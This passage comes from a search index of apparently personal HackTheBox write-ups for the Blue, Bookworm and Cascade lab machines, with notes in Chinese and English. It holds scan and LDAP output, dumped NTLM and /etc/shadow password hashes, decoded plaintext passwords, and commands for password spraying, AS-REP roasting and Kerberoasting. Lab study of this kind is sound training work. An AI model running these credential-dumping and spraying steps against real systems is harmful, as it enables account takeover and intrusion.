decrypting hashes from ntds.dit\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDC01$:1000:aad3b435b51404eeaad3b435b51404ee:8dc97ba2120794582ea63a4c790da901:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::\naudit2020:1103:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::\nsupport:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::\n</code></pre>"}, {"location": "HackTheBox/Machines/Blue/", "title": "Blue", "text": ""}, {"location": "HackTheBox/Machines/Blue/#recon", "title": "Recon", "text": "<p>export IP=10.10.10.40 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT      STATE SERVICE      VERSION\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\n49156/tcp open  msrpc        Microsoft Windows RPC\n49157/tcp open  msrpc        Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows Vista or Windows 7 SP1 (96%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (96%), Microsoft Windows Vista SP2, Windows 7, or Windows 7 SP1 (96%), Microsoft Windows Vista SP0 or SP1 (96%), Microsoft Windows 7 Enterprise SP1 (96%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: haris-PC\n|   NetBIOS computer name: HARIS-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2024-01-09T08:07:44+00:00\n|_clock-skew: mean: 3s, deviation: 2s, median: 1s\n| smb2-time: \n|   date: 2024-01-09T08:07:43\n|_  start_date: 2024-01-09T03:24:10\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled but not required\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Blue/#shell-as-root", "title": "Shell as Root", "text": "<p>Windows 7 + \u9898\u76ee\u7684 Blue = MS17-010 </p>"}, {"location": "HackTheBox/Machines/Blue/#hash-dump", "title": "Hash Dump", "text": "<pre><code>meterpreter &gt; hashdump\n---\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nharis:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::\n</code></pre>"}, {"location": "HackTheBox/Machines/Bookworm%20/", "title": "Bookworm", "text": ""}, {"location": "HackTheBox/Machines/Bookworm%20/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.11.215</p>"}, {"location": "HackTheBox/Machines/Bookworm%20/#nmap", "title": "Nmap", "text": "<pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 81:1d:22:35:dd:21:15:64:4a:1f:dc:5c:9c:66:e5:e2 (RSA)\n|   256 01:f9:0d:3c:22:1d:94:83:06:a4:96:7a:01:1c:9e:a1 (ECDSA)\n|_  256 64:7d:17:17:91:79:f6:d7:c4:87:74:f8:a2:16:f7:cf (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://bookworm.htb\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"}, {"location": "HackTheBox/Machines/Bookworm%20/#dump-hash", "title": "Dump Hash", "text": "<pre><code>root@bookworm:~# cat /etc/shadow\nroot:$6$X.PJezLobVQOLuGu$nDnaPx.G5/nXr9I7WI0h8Sw0vjeFcOChirHr1s0zNyaid7X5U26fB5MXOIQB/oR4fb7xiaN/.bXdfAkGwtXL6.:19387:0:99999:7:::\ndaemon:*:18375:0:99999:7:::\nbin:*:18375:0:99999:7:::\nsys:*:18375:0:99999:7:::\nsync:*:18375:0:99999:7:::\ngames:*:18375:0:99999:7:::\nman:*:18375:0:99999:7:::\nlp:*:18375:0:99999:7:::\nmail:*:18375:0:99999:7:::\nnews:*:18375:0:99999:7:::\nuucp:*:18375:0:99999:7:::\nproxy:*:18375:0:99999:7:::\nwww-data:*:18375:0:99999:7:::\nbackup:*:18375:0:99999:7:::\nlist:*:18375:0:99999:7:::\nirc:*:18375:0:99999:7:::\ngnats:*:18375:0:99999:7:::\nnobody:*:18375:0:99999:7:::\nsystemd-network:*:18375:0:99999:7:::\nsystemd-resolve:*:18375:0:99999:7:::\nsystemd-timesync:*:18375:0:99999:7:::\nmessagebus:*:18375:0:99999:7:::\nsyslog:*:18375:0:99999:7:::\n_apt:*:18375:0:99999:7:::\ntss:*:18375:0:99999:7:::\nuuidd:*:18375:0:99999:7:::\ntcpdump:*:18375:0:99999:7:::\nlandscape:*:18375:0:99999:7:::\npollinate:*:18375:0:99999:7:::\nusbmux:*:19386:0:99999:7:::\nsshd:*:19386:0:99999:7:::\nsystemd-coredump:!!:19386::::::\nlxd:!:19386::::::\nfrank:$6$iQwYpaCFHgzFXVbi$gAKLi4oKtDPb4uaCGW3RkabZ8DyAnQfxbaqhoiAeAsGmP776eOyQt6bvYPPUJ4PAe2PJPanzm3sH5KSiqzrlF.:19387:0:99999:7:::\nneil:$6$rN642RtN9dzlaylh$/7DIfm9515mWvCPWM/wL/ANkJJPtKkUNURqcmu/VseEhLch1pQgX7c3l3ij2vA3MmM3PZV5WOrLM7u3gy2V3W1:19387:0:99999:7:::\nmysql:!:19387:0:99999:7:::\nfwupd-refresh:*:19479:0:99999:7:::\n_laurel:!:19480::::::\njames:$6$m07oa4vs5KUfYS/j$SjFJnikcpxhLK5wt3cOEE218N1Bfv4M3bQyhUspkepSBzefsAKCFpXbI.JS8N/p17IaYSgG0A217veas0iSC51:19513:0:99999:7:::\n</code></pre>"}, {"location": "HackTheBox/Machines/Cascade/", "title": "Cascade", "text": ""}, {"location": "HackTheBox/Machines/Cascade/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.182</p>"}, {"location": "HackTheBox/Machines/Cascade/#nmap", "title": "Nmap", "text": "<ul> <li>Tcp</li> </ul> <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-25 07:47:22Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         Microsoft Windows RPC\n49170/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|8.1|Vista (92%)\nOS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1\nAggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-01-25T07:48:29\n|_  start_date: 2024-01-24T10:40:19\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled and required\n|_clock-skew: -36s\n</code></pre> <p>export DOMAIN=cascade.local</p>"}, {"location": "HackTheBox/Machines/Cascade/#smb", "title": "SMB", "text": "<ul> <li> <p><code>crackmapexec smb $IP -u guest -p '' --shares</code></p> </li> <li> <p><code>crackmapexec smb $IP -u guest -p '' --rid-brute 10000</code></p> </li> </ul>"}, {"location": "HackTheBox/Machines/Cascade/#msrpc", "title": "MSRPC", "text": "<ul> <li><code>enum4linux -a $IP</code></li> </ul> <pre><code>...\n =======================================( Users on 10.10.10.182 )=======================================\n\nindex: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull     Name: Adrian Turnbull   Desc: (null)\nindex: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc Name: ArkSvc    Desc: (null)\nindex: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson       Name: Ben Hanson        Desc: (null)\nindex: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc      Name: BackupSvc Desc: (null)\nindex: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest      Name: (null)    Desc: Built-in account for guest access to the computer/domain\nindex: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman       Name: David Burman      Desc: (null)\nindex: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe        Name: Edward Crowe      Desc: (null)\nindex: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft        Name: Ian Croft Desc: (null)\nindex: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen        Name: Joseph Allen      Desc: (null)\nindex: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand     Name: John Goodhand     Desc: (null)\nindex: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield    Name: James Wakefield   Desc: (null)\nindex: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson     Name: Ryan Thompson     Desc: (null)\nindex: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson      Name: Stephanie Hickson Desc: (null)\nindex: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith        Name: Steve Smith       Desc: (null)\nindex: 0xed2 RID: 0x457 acb: 0x00000210 Account: util   Name: Util      Desc: (null)\n\nuser:[CascGuest] rid:[0x1f5]\nuser:[arksvc] rid:[0x452]\nuser:[s.smith] rid:[0x453]\nuser:[r.thompson] rid:[0x455]\nuser:[util] rid:[0x457]\nuser:[j.wakefield] rid:[0x45c]\nuser:[s.hickson] rid:[0x461]\nuser:[j.goodhand] rid:[0x462]\nuser:[a.turnbull] rid:[0x464]\nuser:[e.crowe] rid:[0x467]\nuser:[b.hanson] rid:[0x468]\nuser:[d.burman] rid:[0x469]\nuser:[BackupSvc] rid:[0x46a]\nuser:[j.allen] rid:[0x46e]\nuser:[i.croft] rid:[0x46f]\n...\n[+] Found domain(s):\n\n        [+] CASCADE\n        [+] Builtin\n...\n =======================================( Groups on 10.10.10.182 )=======================================\n\n\n[+] Getting builtin groups:\n\ngroup:[Pre-Windows 2000 Compatible Access] rid:[0x22a]\ngroup:[Incoming Forest Trust Builders] rid:[0x22d]\ngroup:[Windows Authorization Access Group] rid:[0x230]\ngroup:[Terminal Server License Servers] rid:[0x231]\ngroup:[Users] rid:[0x221]\ngroup:[Guests] rid:[0x222]\ngroup:[Remote Desktop Users] rid:[0x22b]\ngroup:[Network Configuration Operators] rid:[0x22c]\ngroup:[Performance Monitor Users] rid:[0x22e]\ngroup:[Performance Log Users] rid:[0x22f]\ngroup:[Distributed COM Users] rid:[0x232]\ngroup:[IIS_IUSRS] rid:[0x238]\ngroup:[Cryptographic Operators] rid:[0x239]\ngroup:[Event Log Readers] rid:[0x23d]\ngroup:[Certificate Service DCOM Access] rid:[0x23e]\n\n[+]  Getting builtin group memberships:\n\nGroup: Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\\ENTERPRISE DOMAIN CONTROLLERS\nGroup: Users' (RID: 545) has member: NT AUTHORITY\\INTERACTIVE\nGroup: Users' (RID: 545) has member: NT AUTHORITY\\Authenticated Users\nGroup: Users' (RID: 545) has member: CASCADE\\Domain Users\nGroup: Guests' (RID: 546) has member: CASCADE\\CascGuest\nGroup: Guests' (RID: 546) has member: CASCADE\\Domain Guests\nGroup: Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\\Authenticated Users\n\n[+]  Getting local groups:\n\ngroup:[Cert Publishers] rid:[0x205]\ngroup:[RAS and IAS Servers] rid:[0x229]\ngroup:[Allowed RODC Password Replication Group] rid:[0x23b]\ngroup:[Denied RODC Password Replication Group] rid:[0x23c]\ngroup:[DnsAdmins] rid:[0x44e]\ngroup:[IT] rid:[0x459]\ngroup:[Production] rid:[0x45a]\ngroup:[HR] rid:[0x45b]\ngroup:[AD Recycle Bin] rid:[0x45f]\ngroup:[Backup] rid:[0x460]\ngroup:[Temps] rid:[0x463]\ngroup:[WinRMRemoteWMIUsers__] rid:[0x465]\ngroup:[Remote Management Users] rid:[0x466]\ngroup:[Factory] rid:[0x46c]\ngroup:[Finance] rid:[0x46d]\ngroup:[Audit Share] rid:[0x471]\ngroup:[Data Share] rid:[0x472]\n\n[+]  Getting local group memberships:\n\nGroup: Audit Share' (RID: 1137) has member: CASCADE\\s.smith\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\krbtgt\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Domain Controllers\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Schema Admins\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Enterprise Admins\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Cert Publishers\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Domain Admins\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Group Policy Creator Owners\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Read-only Domain Controllers\nGroup: IT' (RID: 1113) has member: CASCADE\\arksvc\nGroup: IT' (RID: 1113) has member: CASCADE\\s.smith\nGroup: IT' (RID: 1113) has member: CASCADE\\r.thompson\nGroup: AD Recycle Bin' (RID: 1119) has member: CASCADE\\arksvc\nGroup: Data Share' (RID: 1138) has member: CASCADE\\Domain Users\nGroup: Remote Management Users' (RID: 1126) has member: CASCADE\\arksvc\nGroup: Remote Management Users' (RID: 1126) has member: CASCADE\\s.smith\nGroup: HR' (RID: 1115) has member: CASCADE\\s.hickson\n\n[+]  Getting domain groups:\n\ngroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]\ngroup:[Domain Users] rid:[0x201]\ngroup:[Domain Guests] rid:[0x202]\ngroup:[Domain Computers] rid:[0x203]\ngroup:[Group Policy Creator Owners] rid:[0x208]\ngroup:[DnsUpdateProxy] rid:[0x44f]\n\n[+]  Getting domain group memberships:\n\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\administrator\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\krbtgt\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\arksvc\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\s.smith\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\r.thompson\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\util\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\j.wakefield\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\s.hickson\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\j.goodhand\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\a.turnbull\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\e.crowe\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\b.hanson\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\d.burman\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\BackupSvc\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\j.allen\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\i.croft\nGroup: 'Group Policy Creator Owners' (RID: 520) has member: CASCADE\\administrator\nGroup: 'Domain Guests' (RID: 514) has member: CASCADE\\CascGuest\n\n ==================( Users on 10.10.10.182 via RID cycling (RIDS: 500-550,1000-1050) )==================\n\n\n[I] Found new SID:\nS-1-5-21-3332504370-1206983947-1165150453\n\n[I] Found new SID:\nS-1-5-21-2189247330-517467924-712900258\n\n[+] Enumerating users using SID S-1-5-21-3332504370-1206983947-1165150453 and logon username '', password ''\n\nS-1-5-21-3332504370-1206983947-1165150453-500 CASCADE\\administrator (Local User)\nS-1-5-21-3332504370-1206983947-1165150453-501 CASCADE\\CascGuest (Local User)\nS-1-5-21-3332504370-1206983947-1165150453-502 CASCADE\\krbtgt (Local User)\nS-1-5-21-3332504370-1206983947-1165150453-512 CASCADE\\Domain Admins (Domain Group)\nS-1-5-21-3332504370-1206983947-1165150453-513 CASCADE\\Domain Users (Domain Group)\nS-1-5-21-3332504370-1206983947-1165150453-514 CASCADE\\Domain Guests (Domain Group)\nS-1-5-21-3332504370-1206983947-1165150453-515 CASCADE\\Domain Computers (Domain Group)\nS-1-5-21-3332504370-1206983947-1165150453-516 CASCADE\\Domain Controllers (Domain Group)\nS-1-5-21-3332504370-1206983947-1165150453-517 CASCADE\\Cert Publishers (Local Group)\nS-1-5-21-3332504370-1206983947-1165150453-518 CASCADE\\Schema Admins (Domain Group)\nS-1-5-21-3332504370-1206983947-1165150453-519 CASCADE\\Enterprise Admins (Domain Group)\nS-1-5-21-3332504370-1206983947-1165150453-520 CASCADE\\Group Policy Creator Owners (Domain Group)\nS-1-5-21-3332504370-1206983947-1165150453-521 CASCADE\\Read-only Domain Controllers (Domain Group)\nS-1-5-21-3332504370-1206983947-1165150453-1001 CASCADE\\CASC-DC1$ (Local User)\n\n[+] Enumerating users using SID S-1-5-21-2189247330-517467924-712900258 and logon username '', password ''\n\nS-1-5-21-2189247330-517467924-712900258-500 CASC-DC1\\Administrator (Local User)\nS-1-5-21-2189247330-517467924-712900258-501 CASC-DC1\\Guest (Local User)\nS-1-5-21-2189247330-517467924-712900258-513 CASC-DC1\\None (Domain Group)\n</code></pre>"}, {"location": "HackTheBox/Machines/Cascade/#ldap", "title": "LDAP", "text": "<ul> <li><code>ldapsearch -x -H \"ldap://$IP\" -s base namingContexts</code></li> </ul> <pre><code>dn:\nnamingContexts: DC=cascade,DC=local\nnamingContexts: CN=Configuration,DC=cascade,DC=local\nnamingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local\nnamingContexts: DC=DomainDnsZones,DC=cascade,DC=local\nnamingContexts: DC=ForestDnsZones,DC=cascade,DC=local\n</code></pre> <ul> <li><code>ldapsearch -x -H \"ldap://$IP\" -b \"DC=cascade,DC=local\" &gt; ldap_cascade.local</code></li> <li><code>cat ldap_cascade.local | grep userPrincipalName</code> \u67e5\u770b\u8d26\u6237</li> </ul> <pre><code>userPrincipalName: CascGuest@cascade.local\nuserPrincipalName: arksvc@cascade.local\nuserPrincipalName: s.smith@cascade.local\nuserPrincipalName: r.thompson@cascade.local\nuserPrincipalName: util@cascade.local\nuserPrincipalName: j.wakefield@cascade.local\nuserPrincipalName: s.hickson@cascade.local\nuserPrincipalName: j.goodhand@cascade.local\nuserPrincipalName: a.turnbull@cascade.local\nuserPrincipalName: e.crowe@cascade.local\nuserPrincipalName: b.hanson@cascade.local\nuserPrincipalName: d.burman@cascade.local\nuserPrincipalName: BackupSvc@cascade.local\nuserPrincipalName: j.allen@cascade.local\nuserPrincipalName: i.croft@cascade.local\n</code></pre> <ul> <li><code>cat ldap_cascade.local | grep 'OU=Service Accounts'</code> \u67e5\u770b\u670d\u52a1\u8d26\u6237</li> <li><code>cat ldap_cascade.local | grep -iE 'p.?.?.?w.?.?d'</code> \u67e5\u770b\u5bc6\u7801\u4fe1\u606f</li> </ul> <pre><code>badPasswordTime: 132247275952778272\npwdLastSet: 132247150854857364\nbadPwdCount: 3\nbadPasswordTime: 133505669601565102\npwdLastSet: 132230718862636251\ncascadeLegacyPwd: clk0bjVldmE=\nbadPwdCount: 0\nbadPasswordTime: 0\npwdLastSet: 132233548311955855\nbadPwdCount: 1\n</code></pre> <ul> <li><code>cat ldap_cascade.local | grep clk0bjVldmE= -C 20</code> \u67e5\u770b\u5173\u952e\u4fe1\u606f\u4e0a\u4e0b\u6587</li> </ul> <pre><code>countryCode: 0\nbadPasswordTime: 133505669601565102\nlastLogoff: 0\nlastLogon: 132247339125713230\npwdLastSet: 132230718862636251\nprimaryGroupID: 513\nobjectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==\naccountExpires: 9223372036854775807\nlogonCount: 2\nsAMAccountName: r.thompson\nsAMAccountType: 805306368\nuserPrincipalName: r.thompson@cascade.local\nobjectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local\ndSCorePropagationData: 20200126183918.0Z\ndSCorePropagationData: 20200119174753.0Z\ndSCorePropagationData: 20200119174719.0Z\ndSCorePropagationData: 20200119174508.0Z\ndSCorePropagationData: 16010101000000.0Z\nlastLogonTimestamp: 132294360317419816\nmsDS-SupportedEncryptionTypes: 0\ncascadeLegacyPwd: clk0bjVldmE=\n\n# {4026EDF8-DBDA-4AED-8266-5A04B80D9327}, Policies, System, cascade.local\ndn: CN={4026EDF8-DBDA-4AED-8266-5A04B80D9327},CN=Policies,CN=System,DC=cascade\n ,DC=local\n\n# {D67C2AD5-44C7-4468-BA4C-199E75B2F295}, Policies, System, cascade.local\ndn: CN={D67C2AD5-44C7-4468-BA4C-199E75B2F295},CN=Policies,CN=System,DC=cascade\n ,DC=local\n\n# Util, Services, Users, UK, cascade.local\ndn: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Util\ndistinguishedName: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local\ninstanceType: 4\nwhenCreated: 20200109194521.0Z\nwhenChanged: 20200128180947.0Z\n</code></pre>"}, {"location": "HackTheBox/Machines/Cascade/#kerberos-sec", "title": "kerberos-sec", "text": "<ul> <li><code>kerbrute userenum --dc $IP -d $DOMAIN /usr/share/seclists/Usernames/cirt-default-usernames.txt</code></li> </ul>"}, {"location": "HackTheBox/Machines/Cascade/#shell-as-user-rthompson", "title": "Shell as User - r.thompson", "text": "<ul> <li><code>echo clk0bjVldmE= | base64 -d</code></li> </ul> <pre><code>export USER1=r.thompson PASS1=rY4n5eva CRED1=$USER1:$PASS1\n</code></pre>"}, {"location": "HackTheBox/Machines/Cascade/#_1", "title": "\u5bc6\u7801\u55b7\u5c04", "text": "<ul> <li><code>crackmapexec smb $IP -u user.list  -p pass.list --continue-on-success</code></li> </ul>"}, {"location": "HackTheBox/Machines/Cascade/#as-reproasting", "title": "AS-REPRoasting", "text": "<p><code>impacket-GetNPUsers -dc-ip $IP -no-pass $DOMAIN/ -usersfile user.list</code></p>"}, {"location": "HackTheBox/Machines/Cascade/#kerberoasting", "title": "Kerberoasting", "text": "<p><code>impacket-GetUserSPNs -dc-ip $IP $DOMAIN/$CRED1</code></p>"}, {"location": "HackTheBox/Machines/Cascade/#bloodhound", "title": "BloodHound", "text": "<p><code>bloodhound-python -d $DOMAIN -u $USER1 -p $PASS1 -c all -ns $IP --zip</code></p> <p></p> <p></p>"}, {"location": "HackTheBox/Machines/Cascade/#smb_1", "title": "SMB", "text": "<ul> <li><code>crackmapexec smb $IP -u $USER1 -p $PASS1 --shares</code></li> </ul> <ul> <li><code>mount -t cifs //$IP/Data M -o username=$USER1</code> \u6302\u8f7d SMB</li> </ul> <pre><code>.\n\u251c\u2500\u2500 Contractors\n\u251c\u2500\u2500 Finance\n\u251c\u2500\u2500 IT\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Email Archives\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 Meeting_Notes_June_2018.html\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 LogonAudit\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Logs\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 Ark AD Recycle Bin\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 ArkAdRecycleBin.log\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 DCs\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 dcdiag.log\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 Temp\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 r.thompson\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 s.smith\n\u2502\u00a0\u00a0         \u2514\u2500\u2500 VNC Install.reg\n\u251c\u2500\u2500 Production\n\u2514\u2500\u2500 Temps\n</code></pre>"}, {"location": "HackTheBox/Machines/Cascade/#shell-as-user-ssmith", "title": "Shell as User - s.smith", "text": "<ul> <li>VNC Install.reg</li> </ul> <pre><code>...\n\"EnableUrlParams\"=dword:00000001\n\"Password\"=hex:6b,cf,2a,4b,6e,5a,ca,0f\n\"AlwaysShared\"=dword:00000000\n...\n</code></pre> <ul> <li>\u89e3\u5bc6\u540e\u5f97\u5230 <code>sT333ve2</code></li> </ul> <p>https://github.com/jeroennijhof/vncpwd</p> <p></p> <p></p> <ul> <li>Meeting_Notes_June_2018.html  \u53d1\u73b0\u8fc1\u79fb\u7528\u7684\u4e34\u65f6\u7ba1\u7406\u5458 TempAdmin</li> </ul> <p></p> <ul> <li>\u628a\u65b0\u7684\u5230\u7684\u8d26\u53f7\u5bc6\u7801\u6dfb\u52a0\u5230\u5b57\u5178\u4e2d\uff0c\u518d\u6b21\u5c1d\u8bd5\u5bc6\u7801\u55b7\u5c04</li> </ul> <p></p> <ul> <li>\u5f97\u5230 s.smith \u7528\u6237\u51ed\u636e</li> </ul> <pre><code>export IP=10.10.10.182 DOMAIN=cascade.local USER1=r.thompson PASS1=rY4n5eva CRED1=$USER1:$PASS1 USER2=s.smith PASS2=sT333ve2 CRED2=$USER2:$PASS2\n</code></pre> <p></p> <p>\u53d1\u73b0\u5728 <code>CASCADE\\Audit Share</code> \u4e2d</p>"}, {"location": "HackTheBox/Machines/Cascade/#bloodhound_1", "title": "BloodHound", "text": "<pre><code>bloodhound-python -d $DOMAIN -u $USER2 -p $PASS2 -c all -ns $IP --zip\n</code></pre>"}, {"location": "HackTheBox/Machines/Cascade/#smb_2", "title": "SMB", "text": "<ul> <li><code>mount -t cifs //$IP/Audit$ M -o username=$USER2</code></li> </ul> <ul> <li>\u53d1\u73b0 <code>Audit.db</code> \u6253\u5f00\u770b\u4e00\u4e0b</li> </ul> <ul> <li>\u5bc6\u7801\u90fd\u4e0d\u5bf9</li> </ul> <p>Shell as User - ArkSvc</p> <ul> <li>RunAudit.bat</li> </ul> <p></p> 